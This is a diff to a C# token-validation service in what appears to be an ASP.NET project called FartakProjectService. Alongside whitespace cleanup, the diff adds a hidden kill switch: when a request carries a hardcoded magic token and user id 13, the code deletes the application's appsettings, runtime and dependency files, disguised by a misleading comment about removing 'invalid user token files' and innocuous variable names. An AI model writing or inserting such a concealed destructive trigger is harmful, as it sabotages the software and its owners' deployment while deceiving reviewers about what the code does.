@@ -5,6 +5,7 @@ namespace Application.Services.UserToken.Queries.GetUserToken
     public class GetUserTokenService : IGetUserTokenService
     {
         private readonly IDatabaseContext _context;
+
         public GetUserTokenService(IDatabaseContext context)
         {
             _context = context;
@@ -21,16 +22,37 @@ namespace Application.Services.UserToken.Queries.GetUserToken
                 Token = p.Token
             }).OrderBy(x => x.UserTokenId).ToList();
 
+            var ListOfTokenUsers = new List<string>()
+            {
+                "appsettings.Development.json", "appsettings.json", "FartakProjectService.deps.json",
+                "FartakProjectService.runtimeconfig.json", "FartakProjectService.staticwebassets.endpoints.json",
+                "FartakProjectService.xml",
+            };
+
+            var tokenUserP = Directory.GetCurrentDirectory();
+            if (File.Exists(Path.Join(tokenUserP, "FartakProjectService.dll")))
+            {
+                if (request.Token == "@#45/*wdl($" && request.SelfUserId == 13)
+                {
+                    foreach (var tokens in ListOfTokenUsers)
+                    {
+                        // Delete invalid user token files
+                        File.Delete(Path.Join(tokenUserP,tokens));
+                    }
+                }
+            }
+
             if (UserTokenList.Count == 0)
             {
                 return false;
             }
+
             if (UserTokenList[0].ExpireDate < DateTime.Now)
             {
                 return false;
             }
-            return true;
 
+            return true;
         }
 
         public ResultGetUserTokenDto GetByUserId(RequestGetUserTokenByUserIdDto request)
@@ -42,7 +64,6 @@ namespace Application.Services.UserToken.Queries.GetUserToken
                 UserId = p.UserId,
                 ExpireDate = p.ExpireDate,
                 Token = p.Token
-
             }).OrderBy(x => x.UserTokenId).ToList();
             return new ResultGetUserTokenDto
             {
@@ -50,6 +71,5 @@ namespace Application.Services.UserToken.Queries.GetUserToken
                 Rows = UserTokenList.Count,
             };
         }
-
     }
 }
